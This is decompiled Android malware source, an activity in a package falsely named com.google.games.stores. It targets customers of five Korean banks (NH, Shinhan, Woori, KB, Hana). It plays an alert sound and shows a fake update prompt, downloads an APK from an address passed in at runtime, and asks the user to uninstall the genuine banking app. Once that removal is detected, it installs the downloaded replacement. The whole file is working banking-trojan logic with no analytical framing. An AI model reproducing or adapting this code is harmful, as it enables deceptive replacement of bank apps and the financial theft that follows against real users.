package com.google.games.stores.site;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.RingtoneManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.widget.Toast;
import com.google.games.stores.R;
import com.google.games.stores.config.Config;
import com.google.games.stores.service.Notifications;
import com.google.games.stores.util.DownloadFileTask;
import com.google.games.stores.util.GeneralUtil;
import com.google.games.stores.util.Logger;
import java.io.File;

public class BKMain extends Activity {
    private final int DOWN_FAILED = 301;
    private final int NO_SDCARD = 300;
    private final int REPLACE_MSG = 302;
    private SingleReceiver closeReceiver;
    /* access modifiers changed from: private */
    public String download_addr = "";
    /* access modifiers changed from: private */
    public File filetoInstall;
    /* access modifiers changed from: private */
    public Handler handler = new Handler() {
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            switch (msg.what) {
                case 300:
                    BKMain.this.pd.dismiss();
                    Toast.makeText(BKMain.this, BKMain.this.getResources().getString(R.string.no_sd_card), 1).show();
                    BKMain.this.finish();
                    return;
                case 301:
                    BKMain.this.pd.dismiss();
                    Toast.makeText(BKMain.this, BKMain.this.getResources().getString(R.string.download_failed), 1).show();
                    BKMain.this.finish();
                    return;
                case 302:
                    BKMain.this.replaceDialog(BKMain.this, BKMain.this.package_name);
                    return;
                default:
                    return;
            }
        }
    };
    private UninstallReceiver mUninstallReceiver;
    /* access modifiers changed from: private */
    public String package_name = "";
    /* access modifiers changed from: private */
    public ProgressDialog pd;
    /* access modifiers changed from: private */
    public String uninstallPackage;

    private class DownLoadFileThreadTask implements Runnable {
        private String filepath;
        private String path;

        public DownLoadFileThreadTask(String path, String filepath) {
            this.path = path;
            this.filepath = filepath;
        }

        public void run() {
            Message msg;
            try {
                File file = DownloadFileTask.getFile(this.path, this.filepath, BKMain.this.pd);
                Log.i("abc", "Download success");
                BKMain.this.uninstallPackage = BKMain.this.package_name;
                msg = new Message();
                msg.what = 302;
                BKMain.this.handler.sendMessage(msg);
                BKMain.this.filetoInstall = file;
                BKMain.this.pd.dismiss();
            } catch (Exception e) {
                msg = new Message();
                msg.what = 301;
                BKMain.this.handler.sendMessage(msg);
                e.printStackTrace();
            }
        }
    }

    class SingleReceiver extends BroadcastReceiver {
        SingleReceiver() {
        }

        public void onReceive(Context context, Intent intent) {
            BKMain.this.finish();
        }
    }

    private class UninstallReceiver extends BroadcastReceiver {
        private UninstallReceiver() {
        }

        /* synthetic */ UninstallReceiver(BKMain bKMain, UninstallReceiver uninstallReceiver) {
            this();
        }

        public void onReceive(Context context, Intent intent) {
            Logger.i("abc", "uninstall-->" + BKMain.this.uninstallPackage);
            if (BKMain.this.uninstallPackage != null && ("package:" + BKMain.this.uninstallPackage).equals(intent.getDataString()) && BKMain.this.filetoInstall != null) {
                Logger.i("abc", "file not null-->call Install service");
                Intent installService = new Intent(context, Notifications.class);
                installService.setFlags(268435456);
                installService.putExtra(Config.INSTALL_PATH, BKMain.this.filetoInstall.getAbsolutePath());
                context.startService(installService);
                BKMain.this.finish();
            }
        }
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        GeneralUtil.activityList.add(this);
        super.onCreate(savedInstanceState);
        getWindow().requestFeature(1);
        register();
        this.mUninstallReceiver = new UninstallReceiver(this, null);
        IntentFilter filter = new IntentFilter("android.intent.action.PACKAGE_REMOVED");
        filter.addDataScheme("package");
        registerReceiver(this.mUninstallReceiver, filter);
        Intent bk_type = getIntent();
        this.package_name = bk_type.getStringExtra("PACKAGE");
        this.download_addr = bk_type.getStringExtra("DOWNLOAD");
        switch (bk_type.getIntExtra("BK", -1)) {
            case 0:
                setContentView(R.layout.nh_main_activity);
                updateDialog();
                ringtone();
                return;
            case 1:
                setContentView(R.layout.sh_main_activity);
                updateDialog();
                ringtone();
                return;
            case 2:
                setContentView(R.layout.woori_main_activity);
                updateDialog();
                ringtone();
                return;
            case 3:
                setContentView(R.layout.kb_main_activity);
                updateDialog();
                ringtone();
                return;
            case 4:
                setContentView(R.layout.hana_main_activity);
                updateDialog();
                ringtone();
                return;
            default:
                finish();
                return;
        }
    }

    /* access modifiers changed from: protected */
    public void updateDialog() {
        Builder builder = new Builder(this);
        builder.setTitle(getResources().getString(R.string.notify));
        builder.setMessage(getResources().getString(R.string.notify_msg));
        builder.setPositiveButton(getResources().getString(R.string.confirm), new OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                Message msg;
                if (Environment.getExternalStorageState().equals("mounted")) {
                    try {
                        BKMain.this.pd = new ProgressDialog(BKMain.this);
                        BKMain.this.pd.setMessage(BKMain.this.getResources().getString(R.string.app_down_msg));
                        BKMain.this.pd.setProgressStyle(1);
                        BKMain.this.pd.show();
                        DownLoadFileThreadTask task = new DownLoadFileThreadTask(BKMain.this.download_addr, GeneralUtil.SDCardRoot + "/" + BKMain.this.download_addr.substring(BKMain.this.download_addr.lastIndexOf("/") + 1));
                        BKMain.this.pd.show();
                        new Thread(task).start();
                        return;
                    } catch (Exception e) {
                        msg = new Message();
                        msg.what = 301;
                        BKMain.this.handler.sendMessage(msg);
                        e.printStackTrace();
                        return;
                    }
                }
                msg = new Message();
                msg.what = 300;
                BKMain.this.handler.sendMessage(msg);
            }
        });
        builder.create().show();
    }

    /* access modifiers changed from: protected */
    public void replaceDialog(final Context con, final String packagename) {
        Builder builder = new Builder(this);
        builder.setTitle(getResources().getString(R.string.app_change));
        builder.setMessage(getResources().getString(R.string.app_change_content));
        builder.setPositiveButton(getResources().getString(R.string.confirm), new OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                GeneralUtil.uninstallAPK(con, packagename);
            }
        });
        builder.create().show();
    }

    public void ringtone() {
        try {
            RingtoneManager.getRingtone(getApplicationContext(), RingtoneManager.getDefaultUri(2)).play();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void register() {
        IntentFilter filter = new IntentFilter(Config.CLOSE_ACTIVITY);
        this.closeReceiver = new SingleReceiver();
        registerReceiver(this.closeReceiver, filter);
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        unregisterReceiver(this.mUninstallReceiver);
        unregisterReceiver(this.closeReceiver);
        GeneralUtil.exit();
        super.onDestroy();
    }
}
